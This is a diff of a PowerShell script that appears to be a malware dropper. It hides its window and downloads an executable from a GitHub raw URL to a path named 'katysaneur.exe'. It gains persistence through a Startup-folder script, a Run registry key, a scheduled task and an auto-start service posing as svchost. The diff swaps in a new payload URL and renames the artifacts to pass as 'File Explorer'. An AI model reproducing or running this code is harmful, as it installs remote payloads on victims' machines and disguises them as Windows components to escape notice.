@@ -1,8 +1,8 @@
-$FileURL       = "https://github.com/scripthelpercode/00scripthelpx/raw/refs/heads/main/vox.exe"
+$FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
 $LaunchDelay   = 30  # Set the delay to 30 seconds
 $WindowStyle   = "Hidden"
 
-$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileGuardian.ps1"
+$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileExplorer.ps1"
 $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $TaskName       = "FileGuardianTask"
 $TaskPath       = "C:\Windows\System32\Tasks\FileGuardianTask.xml"
@@ -26,7 +26,7 @@ function Set-Persistence {
 
         $servicePath = "$env:SystemRoot\System32\svchost.exe"
         $serviceArgs = "-k netsvcs -p -s $ServiceName"
-        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Guardian Service"
+        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Explorer Service"
         Start-Service -Name $ServiceName
 
         Write-Host "[+] Persistence established."
@@ -60,7 +60,7 @@ function Run-Payload {
         $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "katysaneur.exe"
 
         if (-not (Test-Path $TargetPath)) {
-            Write-Host "[*] File not found â downloading..."
+            Write-Host "[*] File not found downloading..."
             Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
         }
 
